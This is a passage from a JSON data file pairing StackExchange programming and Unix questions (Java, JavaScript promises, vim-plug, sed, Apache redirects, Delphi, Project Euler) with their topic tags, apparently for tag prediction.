    "source": "Utilizing a Java Concurrent Utility from a Web App <eos> I have the following lines of code in my application:return Service is alive since:  + TimeUnit.MILLISECONDS.toMinutes(mxBean.getUptime()) +  minutes;It uses the following package:import java.util.concurrent.TimeUnit;My application is a web application. Does it means that I have something wrong logically if I use something from concurrent package at a web application?",
    "target": "java;design;packages"
  },
  {
    "id": "_codereview.134224",
    "source": "Pseudo Promise.all() polyfill <eos> A few years back I interviewed with a company for a Javascript position. After a couple of warm-up challenges I was presented with this:Please write a function that calls back with true if all  promises have resolved successfully, or false if at least one  promise has rejected.Given 'Promise' API:promise.then(  function resolve() { /* called when some async thing was successful */},  function reject() { /* the async thing failed */ });and also was given the following function structure and mocking code:function all (promises, callback) {    // TODO call back with `true` if all promises resolve(), or `false` if a promise has reject()ed    promises.forEach(function (promise) {        promise.then(          function resolve() {},          function reject() {}        );    });}// Some mocking code (NO NEED TO READ THIS):function P() { return { then: function (resolve, reject) {  setTimeout(function() { (5*Math.random()|0) ? resolve() : reject() }, Math.random()*1000);}}}var promises = [1,2,3,4,5].map(P);all(promises, function (success) {  console.log('The promises have ' + ( success ? '' : 'not ' ) + 'all resolved!' )});The gist of it: I had to write an almost Promise.all() method that would check if all async functions finished and how they finished (resolve/reject).I didn't finish the challenge in the allocated time frame, so I failed (and years later, looking at the code I've written to finally solve it, if was the interviewer, I would failed me even if I was done in time...)My current implementationA few days ago I found the challenged buried on the hard drive and decided to give it a go (I timed myself to finish it in time):Does not re-include the mocking code from above, but it is included in the jsbin belowfunction all (promises, callback) {    const promisesStatus = [];    const allPromisesChecked = (promisesArray = promises, promisesStatusArray = promisesStatus) => promisesStatusArray.length === promisesArray.length;    const allPromisesPassed = (promisesArray = promisesStatus) => {        if (promisesArray.filter(value => !value).length === 0) { return true; }        return false;    };    promises.forEach(function (promise) {        promise.then(          function resolve() {              promisesStatus.push(true);              if (allPromisesChecked() && allPromisesPassed()) { callback(true); }          },          function reject() {              promisesStatus.push(false);              if (allPromisesChecked() && !allPromisesPassed()) { callback(false); }          }        );    });};JSBin: https://jsbin.com/dajini/edit?js,consoleQuestionsKeeping in mind that this is to be done under the clock and under the interviewer's eyes (pair programming), hence under stress...Implementation - Leaving aside minor performance optimizations, could I have done it better? Another way that I am unaware of ?Time - How long does it take you ? (ballpark it) - Originally, I had to code two functions that dealt with string manipulations + this one in under 1 hour",
    "target": "javascript;interview questions;promise"
  },
  {
    "id": "_unix.327803",
    "source": "pine (Alpine) with GMail 2-step Authentication enabled? <eos> I always get a message:IMAP Authentication canceled And then: Retrying plain authentication after [ALERT] application-specificWhen I look at my google security settings I can't find any option to create an application specific password to associate with Alpine on my laptop.https://productforums.google.com/forum/#!topic/gmail/bSQZVxRIjb0",
    "target": "email;authentication;imap;alpine"
  },
  {
    "id": "_cstheory.10386",
    "source": "Minimization on a binary matrix <eos> Assume you are given a matrix$$ X= \\begin{bmatrix} x_1^1 & x_1^2 & \\dots & x_1^m \\\\ x_2^1 & x_2^2 & \\dots & x_2^m \\\\ \\vdots & \\vdots & \\ddots & \\vdots \\\\ x_n^1 & x_n^2 & \\dots & x_n^m \\end{bmatrix} $$such that all $x_i^j \\in \\big\\{0,1\\big\\}$, $\\vee$ is the logical OR, and:$$ \\forall i,j, \\quad x_{i}^j =  \\begin{cases} x_{i+1}^{j}\\vee x_{i+1}^{j-1} & \\text{if }\\:j\\neq1,\\\\ x_{i+1}^1\\vee x_{i}^m & \\text{otherwise}. \\end{cases} $$This is quite similar to the Pascal triangle with binomials, except here we are dealing with $0/1$ variables and regular addition is replaced by the logical OR.The problem now is to minimize: $$S=\\sum_{i,j} x_i^j,$$ where the trivial case $S=0$ with all $x_i^j=0$ is not an option. The sum is the one in the integers: $0<S\\leq n m$.EDIT: What can we say about the case where the $\\vee$ operator is no longer the logical OR, but is defined by: $0\\vee0=0$, $1\\vee0=0\\vee1=1$ and $1\\vee1\\in\\{0,1\\}$.Does this problem reduces to another one? Maybe there are references that I am not aware of. Thanks for your help.",
    "target": "cc.complexity theory;reference request;optimization"
  },
  {
    "id": "_unix.337662",
    "source": "Managing plugins in Ubuntu <eos> Vim-plug installation on Ubuntu 16.10I'm a new user of Ubuntu, and I'd like a little bit of help with plugins. According to this website, I installed vim-plug with this command: curl -fLo ~/.vim/autoload/plug.vim --create-dirs \\    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim I have also created the directory ~/.vim/plugged as suggested. So far I know I have to install my plugins inside (in ~/.vimrc file): call plug#begin('~/.vim/plugged')call plug#end()It is indicated I have to make the content of Download plug.vim available inside the 'autoload' directory. Question 1: What is the 'autoload' directory here?In fact, I want to install vim-plug to install several plugins like nerdtree. The way I understand the procedure is to go over the website https://github.com/scrooloose/nerdtree, and take only the part scrooloose/nerdtree to install the plugin : call plug#begin('~/.vim/plugged')Plug 'scrooloose/nerdtree'call plug#end()then execute :PlugInstall.Question 2 : Where do I have an issue (if there are any)?",
    "target": "ubuntu;vim;plugin"
  },
  {
    "id": "_unix.231832",
    "source": "Shellcheck complains that I should not to read and write the same file in the same pipeline <eos> ShellCheck show the following error for this line of code:printf '%d' $(($(< $1) + 1)) > $1Make sure not to read and write the same file in the same pipelineIs this really a problem? Could reading and writing the same file result in a race condition?",
    "target": "bash;shell;io redirection;shellcheck"
  },
  {
    "id": "_cs.1018",
    "source": "Non-Parametric Methods Like K-Nearest-Neighbours in High Dimensional Feature Space <eos> The main idea of k-Nearest-Neighbour takes into account the $k$ nearest points and decides the classification of the data by majority vote. If so, then it should not have problems in higher dimensional data because methods like locality sensitive hashing can efficiently find nearest neighbours.In addition, feature selection with Bayesian networks can reduce the dimension of data and make learning easier.However, this review paper by John Lafferty in statistical learning points out that non-parametric learning in high dimensional feature spaces is still a challenge and unsolved. What is going wrong?",
    "target": "machine learning;artificial intelligence"
  },
  {
    "id": "_softwareengineering.311472",
    "source": "Strategy Pattern not sufficient for my problem? <eos> Let me sketch the situation:I have multiple users, with certain properties (2 enums)For each user I need to fetch data, for some with some basic filtering, for some extended filtering (= basic filtering + extra filtering). I'd like to do that not separate for every user, but I'd rather group the users and do it in two queries.For every user, I need to filter that data depending on the values of the enums. I will always need to do GetFirstData() (method depending on first enum), GetLastData() (method depending on second enum), CheckData() (depending on both enums). I've been looking at the Strategy Pattern, but it seems that's more designed to implement one behavior. I want to combine my behaviors to avoid making the combinations between all GetFirstData and GetLastData, is there any pattern to do this better? I've been thinking on just using 2 delegates and assign the corresponding methods depending on the values of the enums. Would this be the cleanest way?Little example of what I mean:public class User{   public Enum1 FirstEnum {get; set;}   public Enum2 SecondEnum {get; set;}   ...}public IEnumerable<Data> Filter(int userId, Expression extraFilter){    var data = GetData(userId);    if(extraFilter != null)      data = data.Where(extraFilter);    return data;}public Data GetFirstData(IEnumerable<Data> data);public Data GetLastData(IEnumerable<Data> data);public bool CheckData(IEnumerable<Data> data);My endresult could do something like this:public class EndResult{    public Data FirstResult {get; set;}    public Data SecondResult {get; set;}    public Func<IEnumerable<Data>,Data> GetFirstData {get; set;}    public Func<IEnumerable<Data>,Data> GetLastData {get; set;}    public bool ExtendeFiltering {get; set;}    public EndResult(User user)    {        switch(user.enum1)        {            case: GetFirstData = specificFunction;                  ExtendedFiltering = true;            ...        }        //Second for GetLastData;    }    public void Execute()    {        GetData();        CheckData();        GetFirstData();        GetLastData();    }}Edit: For future readers who are curious, I didn't use delegates (not directly at least). I created 2 interface IFirst and ILast with a corresponding method. In my static create method defined on my processor class, I do the logic to create an instance of those interfaces based on certain conditions. The reason I left the path of directly using delegates is because it turned out I needed more parameters than just User for some of them. So I resorted to different implementations based on the parameters I need in the constructor of those classes.",
    "target": "c#;design patterns;delegates"
  },
  {
    "id": "_softwareengineering.103178",
    "source": "How to handle can you add just a few more fields type of requests from customers? <eos> Very commonly we have feature requests for fields that only one customer wants. This, at best, clutters the application's code. Often when we look in their database a few months after adding the fields, we can see that they are not actually even using the extra fields. Also, it's quite an old application so adding a single field requires multiple code changes, changing reports, and making sure that it doesn't affect other customers who do not need to see the field.How can we make sure that a customer actually needs these feature requests? How do we politely say you don't really need that?Currently we are beginning to charge for certain feature requests. (Previously, feature requests were free usually) Is there anything else we can do? ",
    "target": "customer relations;feature requests"
  },
  {
    "id": "_unix.367197",
    "source": "How to change du recursion order <eos> I've looked into sorting the result of du before and only ever seen suggestions to sort the result such as du | sort.This is acceptable for most uses but it is specifically unhelpful when listing multiple directories with hardlinks.  For example I have an incremental backup:If du doubly count's hard links the content looks like this# du -hl --max-depth 1 /backup/saturn/ | sort -k 23.2G    /backup/saturn/456M    /backup/saturn/2017-05-19458M    /backup/saturn/2017-05-20461M    /backup/saturn/2017-05-21464M    /backup/saturn/2017-05-22462M    /backup/saturn/2017-05-23462M    /backup/saturn/2017-05-24465M    /backup/saturn/2017-05-25But these results aren't true because each dated dir shares a lot of hard links to other dir's files.... It's an incremental backup.But the more meaningful result looks like this.# du -h --max-depth 1 /backup/saturn/ | sort -k 2666M    /backup/saturn/29M     /backup/saturn/2017-05-1953M     /backup/saturn/2017-05-2025M     /backup/saturn/2017-05-2140M     /backup/saturn/2017-05-22462M    /backup/saturn/2017-05-2314M     /backup/saturn/2017-05-2446M     /backup/saturn/2017-05-25This is a little nonsensical because it has evaluated the dirs in an arbitrary order and so gives much less meaningful information on how much has changed from one date to the next.So I'm looking for a way to control the order du evaluates directories.",
    "target": "shell script;disk usage"
  },
  {
    "id": "_webmaster.4095",
    "source": "Why does Google remove PageRank sometimes? <eos> Today I saw my website's page rank gone down from 2 to 0.  It happened once before as well. I don't remember spamming anywhere and I don't have too many posts on my forum. I heard they are very strict about forum websites and frequently try to keep the rank down. Have anyone of you experienced this?",
    "target": "google;pagerank"
  },
  {
    "id": "_codereview.83293",
    "source": "Translating array pointer access from C++ to Delphi <eos> I'd like to know if I translated a piece of code correctly from C++ to Delphi. It looks like it is working, but I have a feeling that I'm reading and writing into memory that I'm not supposed to using Delphi.Given C++ code:struct tile_map{    int32 CountX;    int32 CountY;    uint32 *Tiles;};inline uint32GetTileValueUnchecked(tile_map *TileMap, int32 TileX, int32 TileY){    uint32 TileMapValue = TileMap->Tiles[TileY*TileMap->CountX + TileX];    return(TileMapValue);}uint32 Tiles00[9][17] =    {        {1, 1, 1, 1,  1, 1, 1, 1,  0, 1, 1, 1,  1, 1, 1, 1, 1},        {1, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1},        {1, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1},        {1, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1},        {0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1},        {1, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1},        {1, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1},        {1, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1},        {1, 1, 1, 1,  1, 1, 1, 1,  1, 1, 1, 1,  1, 1, 1, 1, 1},    };// More tile map declarations ...   // uint32 Tiles01[9][17] = ...// uint32 Tiles10[9][17] = ...// uint32 Tiles11[9][17] = ...      tile_map TileMaps[2][2];    TileMaps[0][0].CountX = 17;    TileMaps[0][0].CountY = 9;    TileMaps[0][0].Tiles = (uint32 *)Tiles00;    TileMaps[0][1] = TileMaps[0][0];    TileMaps[0][1].Tiles = (uint32 *)Tiles01;    TileMaps[1][0] = TileMaps[0][0];    TileMaps[1][0].Tiles = (uint32 *)Tiles10;    TileMaps[1][1] = TileMaps[0][0];    TileMaps[1][1].Tiles = (uint32 *)Tiles11;// Usage    int32 PlayerTileX = 2;    int32 PlayerTileY = 2;    uint32 TileMapValue = GetTileValueUnchecked(&TileMap[1][1], PlayerTileX, PlayerTileY);Delphi translation:program Project1;{$APPTYPE CONSOLE}type    Puint32 = ^uint32;    tile_map = record        CountX : int32;        CountY : int32;        Tiles : Puint32;    end;    Ptile_map = ^tile_map;{$POINTERMATH ON}   function GetTileValueUnchecked(TileMap : Ptile_map; TileX, TileY : int32) : uint32; inline;begin    result := TileMap^.Tiles[TileY * TileMap^.CountX + TileX];end;const //in the future these will be read from file, so const for now    Tiles00:  array [0..8, 0..16] of uint32 =    (        (1, 1, 1, 1,  1, 1, 1, 1,  0, 1, 1, 1,  1, 1, 1, 1, 1),        (1, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1),        (1, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1),        (1, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1),        (0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1),        (1, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1),        (1, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1),        (1, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0,  0, 0, 0, 0, 1),        (1, 1, 1, 1,  1, 1, 1, 1,  1, 1, 1, 1,  1, 1, 1, 1, 1)    );    // More tile map declarations ...    //Tiles01:  array [0..8, 0..16] of uint32 = ...    //Tiles10:  array [0..8, 0..16] of uint32 = ...    //Tiles11:  array [0..8, 0..16] of uint32 = ...var     TileMaps : array [0..1, 0..1] of  tile_map;    PlayerTileX, PlayerTileY : int32;    TileMapValue : uint32;begin    TileMaps[0][0].CountX := 17;    TileMaps[0][0].CountY := 9;    TileMaps[0][0].Tiles := Addr(Tiles00);    TileMaps[0][1] := TileMaps[0][0];    TileMaps[0][1].Tiles := Addr(Tiles01);    TileMaps[1][0] := TileMaps[0][0];    TileMaps[1][0].Tiles := Addr(Tiles10);    TileMaps[1][1] := TileMaps[0][0];    TileMaps[1][1].Tiles := Addr(Tiles11);    // Usage    PlayerTileX := 2;    PlayerTileY := 2;    TileMapValue = GetTileValueUnchecked(@TileMaps[1][1], PlayerTileX, PlayerTileY);end.",
    "target": "c++;matrix;delphi"
  },
  {
    "id": "_webmaster.85388",
    "source": "Overriding a redirect with an A record -- What am I doing wrong? <eos> We have a GoDaddy account and are using a redirect as a placeholder for our main site as dictated by management.  They want dev and staging to access our application but everything else to go to the redirect.We want to have access to our application via a staging subdomain.  I can't seem to get this thing to work.  Between the GoDaddy Redirect, the DNS Zone file, the sites-enabled (on our server) and the hosts files, I am stuck.  We're running on an AWS AMI running Ubuntu 14.04.3 LTS.Here's what I'm trying to do (text and numbers have been changed to protect the innocent):If you type in:http://dev.phishmenot.com -> The site in our development directory on our server.http://staging.phismenot.com -> The site in our staging directory on our server.http://[anything else].phishmenot.com ->      (REDIRECT 301: KickoffLabs website)Our configuration is this:Then, we have the actual zone file:My hosts file (on our AWS server):127.0.0.1 localhost67.4.67.45 dev.phishmenot.com67.4.67.45 staging.phishmenot.com# The following lines are desirable for IPv6 capable hosts::1 ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allroutersff02::3 ip6-allhostsAnd here's my staging.phishmenot.com.conf file, sitting in the sites-available directory, with the symlink appropriately sitting in the sites-enabled directory:<VirtualHost staging.phishmenot.com:80>        ServerAdmin admin@phishmenot.comServerName phishmenot.com    ServerAlias staging.phishmenot.comDocumentRoot /var/www/staging/current        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined</VirtualHost>We're using KickoffLabs to do some of our site promotion and I followed their directions for setup.  What is strange is that I DID get the dev site to work.  I just can't remember how I did it.  I think I just kept tweaking things until it worked and then had to get back to development.I am most assuredly NOT a Unix or Server expert.  Call me an informed amateur.  I would like to get this configured in a standard way so when we get someone who DOES know what they're doing, it will be remotely recognizable.UPDATE:I tried the changes you suggested and I now can not reach my www.phishmenot.com site OR the www.kickofflabs.com site.  Here's my .htaccess file; real names and addresses edited out, but consistent with this question:RewriteEngine onRewriteBase /RewriteCond %{HTTP_HOST} !^(dev|staging).phishmenot.com$RewriteRule ^(.*) http://proxy.kickofflabs.com/$1 [QSA,L,R=301]# Hide the application and system directories by redirecting the request to index.phpRewriteRule ^(application|system|\\.svn) index.php/$1 [L]RewriteCond %{REQUEST_FILENAME} !-fRewriteCond %{REQUEST_FILENAME} !-dRewriteRule ^(.*)$ index.php/$1 [QSA,L]Header set Expires Thu, 19 Nov 1981 08:52:00 GMHeader set Cache-Control no-store, no-cache, must-revalidate, post-check=0, pre-check=0Header set Pragma no-cachePer the suggestion, I removed the redirect from GoDaddy, hopefully handling all through the .htaccess file. I also removed the CNAME record for www directing to the kickoff labs proxy.  Now staging redirects to www.phishmenot.com which no longer addresses any server.  I thought the @ in the a record was supposed to catch anything not listed as an A or CNAME record.  NOTE:  The additional mod_rewrite commands are supporting our application framework, CodeIgniter.  If there is a conflict, I can make adjustments.",
    "target": "redirects;dns;godaddy;ubuntu"
  },
  {
    "id": "_webapps.75509",
    "source": "Google Calendar Invite a standard group <eos> I am running a podcast and every week we do a show, however It is not always on the same day and there are new guests each week, so I don't want to make it a regular meeting.That being said what I really want to be able to do is say Invite the normal group and have it invite everyone in that group so I don't forget anyone",
    "target": "google calendar"
  },
  {
    "id": "_softwareengineering.170137",
    "source": "Execute a Managed bean from a JSF view in WEB-INF folder <eos> We are initiating a Spring + Primefaces project and the first problem we have encountered concerns storing the XHTML pages into the WEB-INF folder.When we use a faces form in a view located inside the WEB-INF folder, then the commandButton does not execute the managed bean method. <h:form id=loginForm>    <p:commandButton action=#{LoginMgr.doLogin()} value=Login/> </h:form>Our bean:<bean id=LoginMgr name=LoginMgr class=com.tesipro.channelmanager.business.implemented.CMLoginManager></bean>In fact we think the problem is that with JSF, the pages are rendered using a link to the same page as the action of the form, so if the page is located in WEB-INF it is not publicly accessible.We know that having all our XHTML views in the web folder instead of WEB-INF actually solves the issue, but we would like to store that pages into WEB-INF.",
    "target": "spring;jsf"
  },
  {
    "id": "_softwareengineering.291207",
    "source": "Could changing the return type from void to string introduce breaking changes? <eos> This SDK have an interface like this:public interface Contract {     void update(..);     void action(..);     void delete(..);}Now, we need to change it to something like this:public interface Contract {     String update(..);     String action(..);     String delete(..);}The interface is implemented internally by the SDK; that is not a problem. The question scope is beyond the case who somebody has implemented this interface too outside the SDK.Does this change introduce a breaking change?",
    "target": "java;refactoring;interfaces"
  },
  {
    "id": "_softwareengineering.314118",
    "source": "In Actor Pattern (AKKA.Net) Should actors be classes OR Objects? <eos> Im Just getting started with actor pattern. Coming from UnitOfWork pattern.Lets say i want to create Actor Pattern for a Employee Management System to mark they are present or absent.The Problem Im facing isShould I Create a class Say EmployeesActor instantiate it and use it as a single actor to manage all the employees. So then the messages will specify which particular employee to be marked present.ORShould i create a base class EmployeeActor and then create objects of this class for each employee in the System. This was messages would directly go to the object of EmployeeActor.",
    "target": ".net;actor model;akka"
  },
  {
    "id": "_cs.67013",
    "source": "Why deadlock in cigarette smokers problem <eos> The Little Book of Semaphores (2nd Ed. by Allen B. Downey, section 4.5.1) as well as Wiki (link) mentioned that a trivial solution (as shown below) to the 'Cigarette smokers problem' will cause a deadlock. Somehow I couldn't wrap my head around it. Pls help me undersatnd how deadlock can occur for the below solution.P.S. We assumed agent code cannot be modified and We're free to use semaphores and other variables as neededCode sample (from the book):     Agent A                 Agent B          Agent C1 agentSem.wait()     agentSem.wait()      agentSem.wait()2 tobacco.signal()    paper.signal()       tobacco.signal()3 paper.signal()      match.signal()       match.signal()     Smoker I           Smoker II               Smoker III1 tobacco.wait()       paper.wait()           tobacco.wait()2 paper.wait()         match.wait()           match.wait()3 agentSem.signal()    agentSem.signal()      agentSem.signal()    Assume semaphores 'tobacco', 'paper', and 'match' are  initialized with    zero, and 'agentSem' is initialized with one.",
    "target": "concurrency;deadlocks"
  },
  {
    "id": "_unix.272563",
    "source": "What does the Incoming option refer to in ufw? <eos> I am configuring a firewall on my Linux Mint 17.2 to maximize security, mainly to put my mind at rest that no one will be able to do anything malicious. In gufw, there are options for allowing or blocking incoming or outgoing. By denying incoming, what kinds of communications am I blocking? In other words, what does incoming refer to? (And out of curiosity, what does outgoing refer to?) I assume that incoming is when another computer attempts to connect to you in some manner, while outgoing is just the opposite - when you attempt to connect to another computer. However, I am not sure, so I would appreciate an answer here.",
    "target": "firewall;ufw"
  },
  {
    "id": "_webapps.57808",
    "source": "Check cell value then subtract based on outcome <eos> I have two columns - they look like the following:YESNO  |  AMOUNT________________N      |  13N      |  22Y      |  13The AMOUNT column is a value output from a condition, =IF(E16=1,13,IF(E16=2,22,IF(E16=3,30)))I would like to SUBTRACT 3 from the AMOUNT column IF the YESNO column has a value of Y and I'm just not sure how to arrange this.Any suggestions? What sort of function should I be looking at to make this happen?",
    "target": "google spreadsheets"
  },
  {
    "id": "_webmaster.74177",
    "source": "How to have a blog post in Jekyll parse markdown code with ```java instead of {% highlight java %} <eos> I would like it to parse standard markdown as parsed in github.  I don't like the special syntax of {% highlight java %}.I understand it can parse textile and markdown but I don't get how to change the format of a single blog post to use this syntax with his incompatible with some other systems:```java some java code ```I've noticed that it kind of works, but its syntax highlighting is not as beautiful as with {% highlight java %}. I wish it to be the same.",
    "target": "jekyll;markdown"
  },
  {
    "id": "_unix.239177",
    "source": "Use sed replace with line number from variable <eos> This is my sed command:while ...;do sed -r ${counter}s/^\\S+ /$line /g $in > $out;....doneUnfortunately this command isn't doing anything when called from within a bash script/loop. So I thought to check if the variables are being resolved the right way:do echo sed -r ${counter}s/^\\S+/$line/g $in > $out;which printed this to the console:sed -r <line number>/^\\S+/<replace pattern>/g <infile> > <outfile>When executing this very command (without the ) from the console, I get this:sed: -e expression #1, char 8: unterminated s' commandI guess this is because the ' are missing around the pattern. So how do I combine double (for resolving variables in sed command) and single (for completing the search/replace pattern) quotation marks when calling this from a bash script?",
    "target": "bash;sed"
  },
  {
    "id": "_unix.198848",
    "source": "Change display output with xrandr? <eos> My roommate has a really old 1280x1024 VGA display that the driver sets to 1600x1200 by default and it causes it to display a message saying it can't display the input. I can ctrl+alt+f1 and use xrandr -d :0 to find out the output that's being used but every time I do xrandr --output CRT1 --mode 1280x1024_60.00 it says that it can't find the display. The mode is displayed when I do xrandr -d :0 so I already know it's been added. I can configure it to work properly if I connect our TV as a secondary display but the second I disconnect it, it resets to 1600x1200. I need to get it set to 1280x1024 all the time so he can use his PC.",
    "target": "linux;display;x server;display settings"
  },
  {
    "id": "_codereview.94166",
    "source": "Count the number of combinations with gap-restriction for every pair of values <eos> A lottery draw consists of choosing 6 different values from 1 to 50.I want to calculate the number of combinations with gaps of at least 3 between every pair of values.I have used the following Python 2.7 script:def func(array,length,min,max,gap):    if len(array) == length:        # print array        return 1    count = 0    for n in range(min,max+1):        count += func(array+[n],length,n+gap,max,gap)    return count;print func([],6,1,50,3)Questions:Are there any coding improvements that I can apply?Is there a different method with which we can do it more efficiently?Although more suitable for math.stackexchange.com, is there a straightforward formula?",
    "target": "python;recursion;combinatorics"
  },
  {
    "id": "_unix.57827",
    "source": "Tmux Terminfo problem with Zsh key bindings <eos> Zsh in Emacs edit mode comes with the default key binding ALT + Backspace to delete a word on the right side of the cursor and ALT + D to delete a word on the left side. I would like to add the latter function to ALT + DEL additionally.I tried to use the terminfo database to set the escape sequence for the key combination for every $TERM correctly. In man terminfo I read about kDC3 being the Capname which I probably need to use for ALT + DEL.I added the following line to my ~/.zshrc:bindkey -e `tput kDC3` kill-wordThis works nicely when I connect to my machine directly through SSH ($TERM is xterm). But when I start Zsh inside a Tmux-session ($TERM is screen) I get the following error message:tput: unknown terminfo capability 'kDC3'Could that really mean that it's impossible to bind anything to ALT + DEL in Tmux? Or am I just doing something wrong? Maybe kDC3 is not the correct sequence?I'm running Debian Wheezy Beta 4 x86_64.",
    "target": "debian;terminal;zsh;keyboard shortcuts;tmux"
  },
  {
    "id": "_ai.3295",
    "source": "Reinforcement learning for 2048 <eos> I implemented Actor-Critic with N-step TD prediction to learn to play 2048 (link to the game : http://2048game.com/)For the enviroment I don't use this 2048 implementation. I use a simple one without any graphical interface, just pure matrices. The input for the neural network is the log2 of the game board.The structure of my network is:   1. Input layer   2. Hidden layer with 16 units   3. Softmax layer with 4 units (up, down, left, right) for the actor   4. Linear regression for the criticThe hidden layer is shared between the third and fourth layer.  The reward in the orginal game is the value of the merged cells. For example, if two fours merged than the reward is eight. My reward function is almost the same, except I take the log2 of it.I tried these parameteres and I also tweaked the learning rate, the gamma, but I couldn't achive any good result.  Could You recommend what should I change?",
    "target": "neural networks;reinforcement learning;game ai"
  },
  {
    "id": "_softwareengineering.100528",
    "source": "New Silverlight app. MVVM. RIA Services vs CSLA <eos> Another 2 days of reading and watching demos and here we go.For my enterprise LoB Silverlight app I'm going to use:Prism for UI aspects and modularity.MVVM pattern (using Prism)??? to bring data over and validations...Entity Framework for Data accessSQL Server for dataOk, main dilemma is #3. If I won't use any framework then I will have to figure out how to do all CRUD stuff myself. I can do RESTful WCF, I can do SOAP. All that == MANUAL coding.I can do RIA Services. I kind of see what it does and it is nice for direct match with my data layer BUT it is not that great if there will be lot of business logic. Where would I put it? In my ViewModel? Another question is how those services maintained. Once I generated it - I should maintain them by hand if data changes?I also found CSLA which seems to be nice on one hand but receives lot's of critique.. CSLA will allow me to write business logic and shape object as I needed and than I can pass it through ViewModel and all is well.Something tells me that RIA Services will be much quicker to write. Also, I like the fact that I don't have to include extra dependencies.There is no blogs or mentioning of RIA Services since 2010. Is it going under table? Not widely accepted? Not scaling well for big apps? I'm trying to decide which one I need to bet on. CSLA or RIA Services. OR?",
    "target": "design;design patterns;silverlight;patterns and practices"
  },
  {
    "id": "_softwareengineering.160027",
    "source": "How to capture different build verisons of the same production release artifact version in Artifactory? <eos> Let's say I have artifacts mylibrary-5.2.jar and mylibrary-5.3.jar representing the 5.2 and 5.3 versions of a library that our project creates and publishes for one of our other projects. Does Artifactory support having multiple versions of each of these artifacts to represent the different builds that were performed during a release to construct this artifact? For example, to produce the final version of the 5.2 release of mylibrary aka the artifact: mylibrary-5.2.jar, we went through 3 builds to get to a version that passed our integration environment's automated tests and our user acceptance tests. So there were three separate builds that produced three separate artifacts for release 5.2. We want to be able to retain and potentially recall these different build's artifact at a later date (for testing, etc).In order to do this, which of the following options would work?Capture the artifacts as separate Artifacts, i.e.build-5.2-b1.jar (build 1's artifact), build-5.2-b2.jar (build 2'sartifact), build-5.2-b3.jar (build 3's artifact), and build-5.2.jar(the final production release; which matches build 3)Capture a SINGLE artifact named build-5.2.jar which hasVERSIONS of the artifact which capture builds 1 through 3 and whichcan be recalled later, by version number. Some other option we have not considered, but should",
    "target": "version control"
  },
  {
    "id": "_codereview.50965",
    "source": "Speeding up Project Euler 43 - sub-string divisibility <eos> The number, 1406357289, is a 0 to 9 pandigital number because it is  made up of each of the digits 0 to 9 in some order, but it also has a  rather interesting sub-string divisibility property.Let d1 be the 1st digit, d2 be the 2nd digit, and so on. In this way,  we note the following:d2d3d4=406 is divisible by 2d3d4d5=063 is divisible by 3d4d5d6=635 is divisible by 5d5d6d7=357 is divisible by 7d6d7d8=572 is divisible by 11d7d8d9=728 is divisible by 13d8d9d10=289 is divisible by 17Find the sum of all 0 to 9 pandigital numbers with this property.Project Euler 43from itertools import permutationsfrom primes import primes_uptofrom collections import Counterfrom timeit import default_timer as timerstart = timer()def follows_property(n):    divisors = primes_upto(17)    for k in range(7):        if int(n[k:(k+3)]) % divisors[k] != 0:            return False    return Trueans = 0digits = Counter(range(10))start = timer()for combo in permutations(range(10), 9):    num = ''.join([str(x) for x in list(combo)])    if follows_property(num):        missing = int(list((digits - Counter(sorted([int(k) for k in str(num)]))).elements())[0])        num = int(num)        ans += int(%d%d % (missing, num))elapsed_time = (timer() - start) * 1000 # s --> msprint Found %d in %r ms. % (ans, elapsed_time)",
    "target": "python;optimization;performance;strings;programming challenge"
  },
  {
    "id": "_unix.171388",
    "source": "Character class bug in nvi: [[:digit:]] is interpreted like [[:alnum:]] <eos> A simple search in nvi on text such as:the quick red fox jumped 1 foot over the lazy 28 pound dogusing the following search/[[:digit:]]behaves like/[[:alnum:]]That is, it finds every character when repeated.  For that matter all of the bracket expressions I tried behaved as alnum.  However/[0-9]worked as expected just finding 1, 2, and 8. I've been using nvi for some time but there's a yawning chasm in my knowledge here.  Help is appreciated.",
    "target": "vi;nvi"
  },
  {
    "id": "_codereview.44135",
    "source": "Is it OK to use while ((line = r.readLine()) != null) construct? <eos> I want to refactor the following code because I don't feel comfortable about using assignment inside comparison operator. It looks like pretty idiomatic C, but do you think this is a good practice in Java?private void demoA(BufferedReader reader) throws IOException {    String line = null;    while ((line = reader.readLine()) != null) {        doSomething(line);              }}Here is an alternative.private void demoB(BufferedReader reader) throws IOException {    String line = reader.readLine();    while (line != null) {        doSomething(line);        line = reader.readLine();    }}UPDATE: I've stumbled across a similar question asked couple years ago. It seems that opinions on whether it's OK or not are divided. However, both Guava and Commons IO provide alternative solutions for this issue. If I had any of these libs in the current project, I'd probably use them instead.",
    "target": "java;stream"
  },
  {
    "id": "_webmaster.103539",
